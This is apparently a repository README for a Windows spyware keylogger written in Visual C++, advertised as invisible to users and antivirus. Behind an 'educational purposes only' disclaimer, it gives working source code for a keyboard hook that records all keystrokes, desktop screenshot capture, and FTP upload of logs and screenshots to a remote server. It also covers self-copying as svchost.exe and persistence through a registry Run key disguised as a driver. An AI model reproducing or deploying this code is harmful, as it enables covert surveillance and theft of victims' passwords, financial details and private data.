
#### DISCLAIMER : OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON'T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.

# Advance-System-Keylogger

Advance System Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. Advance System keylogger Monitors all keystokes, Mouse clicks. It has a seperate process which continues capture system screenshot and send to ftp server in given time. 

Advance System Keylogger designed in visual C++ and it is run in the background in stealth mode(Hidden Window).

```
A Keylogger (short for keystroke logger) is software that tracks or logs the keys struck on your keyboard, 
typically in a covertmannerso that you don’t know that your actions are being monitored. 
This is usually done with malicious intent to collect your account information, credit card numbers,
user names, passwords, and other private data.
```

### FEATURES OF ADVANCE KEYLOGGER

- Discrete/Tamper Proof :By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees (who are often tech savvy). It does not appear in the Registry, the Process List, the System Tray, the Task Manager, on the Desktop, or in the Add/Remove programs.

- Keystrokes Typed: See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail. 

- Continuous Screenshots: Video-style playback of screenshots for programs and websites selected by you. For example, watch an email as it's being typed and edited instead of just seeing the finished product (1,000 screenshots included with purchase).

- FTP Server: Screenshot and keylogger Logfile which contain senstive user information send to ftp server (Mobile/Web/System). Powerful ftp server also write in Core Visual C++.

- AutoStart : Keylogger has functionaility to auto execute on system bootup. It Insert entry on system startup program when it is running.

- AutoCopy : Keylogger has functionaility to auto copy in %appdata%/roaming/wpdnse/ folder.

### Visual C++ Source Code

#### Capture Screenshot

```
void screenshot(string file){
	ULONG_PTR gdiplustoken;
	GdiplusStartupInput gdistartupinput;
	GdiplusStartupOutput gdistartupoutput;

	gdistartupinput.SuppressBackgroundThread = true;
	GdiplusStartup(& gdiplustoken,& gdistartupinput,& gdistartupoutput); //start GDI+

	HDC dc=GetDC(GetDesktopWindow());//get desktop content
	HDC dc2 = CreateCompatibleDC(dc);	 //copy context

	RECT rc0kno;

	GetClientRect(GetDesktopWindow(),&rc0kno);// get desktop size;
	int w = rc0kno.right-rc0kno.left;//width
	int h = rc0kno.bottom-rc0kno.top;//height

	HBITMAP hbitmap = CreateCompatibleBitmap(dc,w,h);//create bitmap
	HBITMAP holdbitmap = (HBITMAP) SelectObject(dc2,hbitmap);

	BitBlt(dc2, 0, 0, w, h, dc, 0, 0, SRCCOPY);//copy pixel from pulpit to bitmap
	Bitmap* bm= new Bitmap(hbitmap,NULL);

	UINT num;
	UINT size;

	ImageCodecInfo *imagecodecinfo;
	GetImageEncodersSize(&num,&size); //get count of codec

	imagecodecinfo = (ImageCodecInfo*)(malloc(size));
	GetImageEncoders (num,size,imagecodecinfo);//get codec

	CLSID clsidEncoder;

	for(int i=0; i < num; i++)
	{
		if(wcscmp(imagecodecinfo[i].MimeType,L"image/jpeg")==0)
			clsidEncoder = imagecodecinfo[i].Clsid;//get jpeg codec id

	}

	free(imagecodecinfo);

	wstring ws;
	ws.assign(file.begin(),file.end());//sring to wstring
	bm->Save(ws.c_str(),& clsidEncoder); //save in jpeg format
	SelectObject(dc2,holdbitmap);//Release Objects
	DeleteObject(dc2);
	DeleteObject(hbitmap);

	ReleaseDC(GetDesktopWindow(),dc);
	GdiplusShutdown(gdiplustoken);

}

```

#### Send Screenshot to Server Via FTP

```
void ftp_scrshot_send(){

	HINTERNET hInternet;
	HINTERNET hFtpSession;

	DWORD rec_timeout = 5000;

	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		if(hInternet == NULL){
			log_error_file<<"Error:"<<GetLastError();
		}
		else{
			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));
			if(hFtpSession == NULL){

				log_error_file<<"Error:"<<GetLastError();
			}
			else{
				if(!FtpPutFile(hFtpSession,"core32.mni","hacks/sc/dc.jpg",FTP_TRANSFER_TYPE_BINARY,0)){
					log_error_file<<"Error:"<<GetLastError();
				}
			}	
		}

	log_error_file.close();
}
```
#### Send KeyLog Data to FTP Server

```
void ftplogsend(){


	HINTERNET hInternet;
	HINTERNET hFtpSession;

	DWORD rec_timeout = 2000;

	hInternet = InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);

		if(hInternet == NULL){
			log_error_file<<"Error:"<<GetLastError();
		}
		else{
			hFtpSession = InternetConnect(hInternet,"192.168.8.2",2121,NULL,NULL,INTERNET_SERVICE_FTP,0,0);
			InternetSetOption(hInternet,INTERNET_OPTION_SEND_TIMEOUT,&rec_timeout,sizeof(rec_timeout));


			if(hFtpSession == NULL){

				log_error_file<<"Error:"<<GetLastError();
			}
			else{
				if(!FtpPutFile(hFtpSession,"atapi.sys","hacks/hacks.txt",FTP_TRANSFER_TYPE_BINARY,0)){
					log_error_file<<"Error:"<<GetLastError();
					log_error_file.close();
				}
			}


		}
	}
```

#### Auto Copy in AppData Folder & Intialize Keylog Text File with Date Time Stamp

```
void AutoCopy(){

	string f_path = userlc;
	string f_name=f_path;
	f_name+="\\svchost.exe";//file name
	char my_name[260];
	GetModuleFileName(GetModuleHandle(0),my_name,260);//name of running process
	string f_my=my_name;
	CreateDirectory(f_path.c_str(),NULL);
	CopyFile(f_my.c_str(),f_name.c_str(),FALSE);

}

void Install(){

	SYSTEMTIME st;
	GetLocalTime(&st);
	int year = st.wYear;
	int month = st.wMonth;
	int day = st.wDay;
	int hour = st.wHour;
	int mintue = st.wMinute;

	string yearS =  to_string(year);
	yearS += "_";
	string monthS =  to_string(month);
	monthS += "-";
	string dayS =  to_string(day);
	dayS += "-";
	string hourS =  to_string(hour);
	hourS += "H-";
	string mintueS =  to_string(mintue);
	mintueS += "M------------>\n\n";

	string startDate = "\n\n";
	startDate += dayS + monthS + yearS + hourS + mintueS;
	char dateCh[260];
	strcpy(dateCh,startDate.c_str());


	string ff_path = userlc;
	char szDir[260];
	strcpy(szDir,ff_path.c_str());
	strcat(szDir,"atapi.sys");
	FILE *file;
	file = fopen(szDir, "a+");

	fputs(dateCh,file);
	fclose(file);

}
```

#### AutoStart on System Bootup

```
void AutoStart()
{
	char Driver[MAX_PATH];
	HKEY hKey;
	string ff_path = userlc + "svchost.exe";
	strcpy(Driver,ff_path.c_str());
	RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char *)Driver, MAX_PATH);
	RegCloseKey(hKey);
}
```

#### Main Keylooger Function Which Detect Keystroke & Run In Stealth Mode

```
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
	userpath();
	AutoCopy(); //autocopy
	AutoStart(); // auto start everytime
	Sleep(1000*60*1);
	Install(); // write log date
	screenshot("core32.mni");
	ftp_scrshot_send();
	ftplogsend();
	StartKeyLogging();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
	DWORD dwMsg = 1;
	string ff_path = userlc;
	char szDir[260];
	strcpy(szDir,ff_path.c_str());
	strcat(szDir,"atapi.sys");
	FILE *file;
	file = fopen(szDir, "a+");
	DWORD dwAttrs = GetFileAttributesA(szDir);
	//	if (dwAttrs!= (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN))
	//	SetFileAttributesA(szDir, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN); 
	switch (wParam)
	{
	case WM_KEYDOWN:
		{
			DWORD vkCode = pKeyBoard->vkCode;
			if (GetAsyncKeyState(VK_SHIFT))
			{
				switch (vkCode)
				{
				case 0x30:
					fputs("[)]", file);
					break;
				case 0x31:
					fputs("[!]", file);
					break;
				case 0x32:
					fputs("[@]", file);
					break;
				case 0x33:
					fputs("[#]", file);
					break;
				case 0x34:
					fputs("[$]", file);
					break;
				case 0x35:
					fputs("[%]", file);
					break;
				case 0x36:
					fputs("[^]", file);
					break;
				case 0x37:
					fputs("[&]", file);
					break;
				case 0x38:
					fputs("[*]", file);
					break;
				case 0x39:
					fputs("[(]", file);
					break;
				case 0xBF:
					fputs("[?]", file); ///
					break;
				case 0xBB:
					fputs("[+]", file);
					break; 
				case 0xBE:
					fputs("[<]", file);
					break; 
				case 0xBD:
					fputs("[_]", file);
					break;
				case 0xE2:
					fputs("[>]", file);
					break;
				case 0x1C:
					fputs("[VK_CONVERT]",file);
					break;
				case 0x56:
					fputs("[@]", file);
					break;
				case  0x2A:
					fputs ("[PRINT]",file);
					break;
				case  0x2E:
					fputs ("[Delete]",file);
					break;
				case 0xAA:
					fputs("[Search]",file);
					break;
				case  0xF2:
					fputs("[Copy]",file);
					break;
				case 0xFE:
					fputs("[Clear]",file);
					break;
				case  0x3:
					fputs("[Connect]",file);
					break;
				case 0x6:
					fputs("[Logoff]",file);
					break;
				}
			}
			else
			{
				switch (vkCode)
				{
				case 0x30:
					fputs("0", file);
					break;
				case 0x31:
					fputs("1", file);
					break;
				case 0x32:
					fputs("2", file);
					break;
				case 0x33:
					fputs("3", file);
					break;
				case 0x34:
					fputs("4", file);
					break;
				case 0x35:
					fputs("5", file);
					break;
				case 0x36:
					fputs("6", file);
					break;
				case 0x37:
					fputs("7", file);
					break;
				case 0x38:
					fputs("8", file);
					break;
				case 0x39:
					fputs("9", file);
					break;
				case 0xBF:
					fputs("/", file);
					break;
				case 0xBB:
					fputs("=", file);
					break;
				case 0xBC:
					fputs(",", file);
					break;
				case 0xBE:
					fputs(".", file);
					break;
				case 0xBD:
					fputs("-", file);
					break;
				case 0xE2:
					fputs("<", file);
					break;
				}
			}
			if (!(GetAsyncKeyState(VK_SHIFT)))

			{
				switch (vkCode)
				{
				case 0x41:
					fputs("a", file);
					break;
				case 0x42:
					fputs("b", file);
					break;
				case 0x43:
					fputs("c", file);
					break;
				case 0xBA:
					fputs("č", file);
					break;
				case 0x44:
					fputs("d", file);
					break;
				case 0x45:
					fputs("e", file);
					break;
				case 0x46:
					fputs("f", file);
					break;
				case 0x47:
					fputs("g", file);
					break;
				case 0x48:
					fputs("h", file);
					break;
				case 0x49:
					fputs("i", file);
					break;
				case 0x4A:
					fputs("j", file);
					break;
				case 0x4B:
					fputs("k", file);
					break;
				case 0x4C:
					fputs("l", file);
					break;
				case 0x4D:
					fputs("m", file);
					break;
				case 0x4E:
					fputs("n", file);
					break;
				case 0x4F:
					fputs("o", file);
					break;
				case 0x50:
					fputs("p", file);
					break;
				case 0x52:
					fputs("r", file);
					break;
				case 0x53:
					fputs("s", file);
					break;
				case 0x54:
					fputs("t", file);
					break;
				case 0x55:
					fputs("u", file);
					break;
				case 0x56:
					fputs("v", file);
					break;
				case 0x5A:
					fputs("z", file);
					break;
				case 0xDC:
					fputs("\\", file);
					break;
				case 0x51:
					fputs("q", file);
					break;
				case 0x57:
					fputs("w", file);
					break;
				case 0x59:
					fputs("y", file);
					break;
				case 0x58:
					fputs("x", file);
					break;
				case 0xDE:
					fputs("ć", file);
					break;
				case 0xDD:
					fputs("đ", file);
					break;
				default:
					fputs(" ", file);
				}
			}

			if ((GetAsyncKeyState(VK_SHIFT)))

			{
				switch (vkCode)
				{
				case 0x41:
					fputs("A", file);
					break;
				case 0x42:
					fputs("B", file);
					break;
				case 0x43:
					fputs("C", file);
					break;
				case 0xBA:
					fputs("č", file);
					break;
				case 0x44:
					fputs("D", file);
					break;
				case 0x45:
					fputs("E", file);
					break;
				case 0x46:
					fputs("F", file);
					break;
				case 0x47:
					fputs("G", file);
					break;
				case 0x48:
					fputs("H", file);
					break;
				case 0x49:
					fputs("I", file);
					break;
				case 0x4A:
					fputs("J", file);
					break;
				case 0x4B:
					fputs("K", file);
					break;
				case 0x4C:
					fputs("L", file);
					break;
				case 0x4D:
					fputs("M", file);
					break;
				case 0x4E:
					fputs("N", file);
					break;
				case 0x4F:
					fputs("O", file);
					break;
				case 0x50:
					fputs("P", file);
					break;
				case 0x52:
					fputs("R", file);
					break;
				case 0x53:
					fputs("S", file);
					break;
				case 0x54:
					fputs("T", file);
					break;
				case 0x55:
					fputs("U", file);
					break;
				case 0x56:
					fputs("V", file);
					break;
				case 0x5A:
					fputs("Z", file);
					break;
				case 0x51:
					fputs("Q", file);
					break;
				case 0x57:
					fputs("W", file);
					break;
				case 0x59:
					fputs("Y", file);
					break;
				case 0x58:
					fputs("X", file);
					break;
				default:
					fputs(" ", file);
				}
			}


			else VK_SHIFT  + KF_ALTDOWN ;

			switch (vkCode)
			{
			case VK_SPACE:
				fputs("[Space]", file);
				break;
			case 0x2E:
				fputs("[Delete]", file);
				break;
			case VK_BACK:
				fputs("[BackSpace]", file);
				break;
			case VK_RETURN:
				fputs("[Enter]\n", file);
				break;
			case VK_LCONTROL:
				fputs("[Ctrl]", file);
				break;
			case VK_RCONTROL:
				fputs("[Ctrl]", file);
				break;
			case VK_TAB:
				fputs("[Tab]", file);
				break;
			case 0x25:
				fputs("[Left Arrow]", file);
				break;
			case 0x26:
				fputs("[Up Arrow]", file);
				break;
			case 0x27:
				fputs("[Right Arrow]", file);
				break;
			case 0x28:
				fputs("[Down Arrow]", file);
				break;
			case VK_ESCAPE:
				fputs("[Esc]", file);
				break;
			case VK_CAPITAL:
				fputs("[Caps Lock]", file);
				break;
			case VK_RSHIFT:
				fputs("[Right Shift]", file);
				break;
			case VK_LSHIFT:
				fputs("[Left Shift]", file);
				break;
			case VK_LMENU:
				fputs("[Left Alt]", file);
				break;
			case VK_RMENU:
				fputs("[Right Alt]", file);
				break;
			case VK_LWIN:
				fputs("[Left Win]", file);
				break;
			case VK_RWIN:
				fputs("[Right Win]", file);
				break;
			case VK_INSERT:
				fputs("[Insert]", file);
				break;
			case VK_SCROLL:
				fputs("[Scroll Lock]", file);
				break;
			case VK_HOME:
				fputs("[Home]", file);
				break;
			case VK_END:
				fputs("[End]", file);
				break;
			case VK_PRIOR:
				fputs("[Page Up]", file);
				break;
			case VK_NEXT:
				fputs("[Page Down]", file);
				break;
			case VK_SNAPSHOT:
				fputs("[Print Screen]", file);
				break;
			case VK_OEM_3:
				fputs("[ ~ ` ]", file);
				break;
			case VK_OEM_4:
				fputs("[ { [ ]", file);
				break;
			case VK_OEM_6:
				fputs("[ } ] ]", file);
				break;
			case VK_OEM_1:
				fputs("[ : ; ]", file);
				break;
			case VK_OEM_7:
				fputs("[ \" ' ]", file);
				break;
			case VK_F1:
				fputs("[F1]", file);
				break;
			case VK_F2:
				fputs("[F2]", file);
				break;
			case VK_F3:
				fputs("[F3]", file);
				break;
			case VK_F4:
				fputs("[F4]", file);
				break;
			case VK_F5:
				fputs("[F5]", file);
				break;
			case VK_F6:
				fputs("[F6]", file);
				break;
			case VK_F7:
				fputs("[F7]", file);
				break;
			case VK_F8:
				fputs("[F8]", file);
				break;
			case VK_F9:
				fputs("[F9]", file);
				break;
			case VK_F10:
				fputs("[F10]", file);
				break;
			case VK_F11:
				fputs("[F11]", file);
				break;
			case VK_F12:
				fputs("[F12]", file);
				break;
			case VK_NUMPAD0:
				fputs("0", file);
				break;
			case VK_NUMPAD1:
				fputs("1", file);
				break;
			case VK_NUMPAD2:
				fputs("2", file);
				break;
			case VK_NUMPAD3:
				fputs("3", file);
				break;
			case VK_NUMPAD4:
				fputs("4", file);
				break;
			case VK_NUMPAD5:
				fputs("5", file);
				break;
			case VK_NUMPAD6:
				fputs("6", file);
				break;
			case VK_NUMPAD7:
				fputs("7", file);
				break;
			case VK_NUMPAD8:
				fputs("8", file);
				break;
			case VK_NUMPAD9:
				fputs("9", file);
				break;
			case 0x6F:
				fputs("[/]", file);
				break;
			case 0x6A:
				fputs("[*]", file);
				break;
			case 0x6D:
				fputs("[-]", file);
				break;
			case 0x6B:
				fputs("[+]", file);
				break;
			case 0x6E:
				fputs("[,]", file);
				break;
			}
		}
	case WM_SYSKEYDOWN:
		{
			DWORD vkCode = pKeyBoard->vkCode;
			if (GetAsyncKeyState(VK_RSHIFT))
			{
				switch (vkCode)
				{
				case 0x51:
					fputs("[\\]", file);
					break;
				case 0x57:
					fputs("[|]", file);
					break;
				case 0xDB:
					fputs("[{]", file);
					break;
				case 0xDD:
					fputs("[}]", file);
					break;
				case 0xDC:
					fputs("[|]", file);
					break;
				case 0x56:
					fputs("[@]", file);
					break; 
				case 0xBE:
					fputs("[>]", file);
					break;
				}
			}
		}
	default:
		fclose(file);
		return CallNextHookEx( NULL, nCode, wParam, lParam );
	}
	fclose(file);
	return 0;
}
DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
	HHOOK hKeyHook;
	HINSTANCE hExe = GetModuleHandle(NULL);
	if (hExe == NULL)
	{
		return 1;
	}
	else
	{
		hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0) != 0)
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(hKeyHook);
	}
	return 0;
}



int StartKeyLogging()
{
	HANDLE hThread;
	DWORD dwThread;
	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger,NULL, 0, NULL);
	if (hThread)
	{
		return WaitForSingleObject(hThread, INFINITE);
	}
	else
	{
		return 1;
	}
}

```
